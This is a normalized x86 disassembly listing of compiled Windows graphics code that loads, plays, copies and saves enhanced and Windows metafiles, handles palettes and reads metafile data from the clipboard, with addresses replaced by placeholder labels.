pop ecx
mov [ fs : eax ] edx
push sub_42024a
lea eax [ ebp - 0x48 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40346c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40346c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_420261
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4031a8
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402b54
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_4202b0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_42032c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_42013c
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
push ebp
call sub_4202b0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4203a8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41c088
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4203e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41f2a4
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_420430
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_421408
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4144d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_420460
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_421408
mov edx esi
mov eax ebx
call sub_414500
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_421404
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_4204f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41dd2c
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41dd2c
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41dd2c
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41dd2c
push eax
call SelectPalette
sub_42058c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420734
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_4205f0
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41c088
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_42067c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420734
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_4206e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420c5c
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415b9c
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_420898
mov edx esi
mov eax ebx
call sub_4207c8
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_420734
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_421408
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_421404
pop esi
pop ebx
retn
sub_42075c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_420c5c
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_420898
mov edx esi
mov eax ebx
call sub_4207c8
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_4207c8
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_420734
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_415dc8
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420888
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028b8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_415dc8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e01c
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42088f
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41e01c
sub_420898
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_420734
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41e01c
lea eax [ ebp - 0x22 ]
call sub_41ee6c
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420a07
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e01c
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a0e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026dc
retn
call sub_41e01c
sub_420a18
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420abf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_420a9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4085e4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c44c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043b4
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420aa4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_420af8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420734
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420b6c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420b6c
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_420b6c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_420734
pop esi
pop ebx
retn
mov eax ebx
call sub_420cbc
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420ba8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_420734
pop esi
pop ebx
retn
mov eax ebx
call sub_420cbc
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420be8
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420734
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420ba8
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420ba8
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_420c5c
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415b9c
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_420cbc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_420734
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_421408
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_421404
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_420d40
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_415b9c
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_420e4c
mov edx ebx
mov eax esi
call sub_420dc0
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_420dc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420e3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415e00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
sub_420e4c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402c64
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_415e00
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415e00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f6e
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41e07c
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41ee6c
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420f87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420f67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_420f94
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_420734
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41dfec
sub_421018
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_4210e8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4142b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421186
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42118d
mov eax [ rw-data ]
call sub_414314
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42115e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_421278
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41dc24
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413f44
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41dbc8
test al al
je r-xdata
sub_421194
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4142b0
mov esi eax
xor ecx ecx
push ebp
push sub_421204
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414314
retn
mov edx ebx
mov eax esi
call sub_413f44
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_421278
sub_421210
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41d734
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42124c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_421278
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d7f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_421278
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41da38
xor edx edx
push ebp
push sub_42130c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41ddac
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4142c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc24
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_421318
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41da38
xor eax eax
push ebp
push sub_4213f7
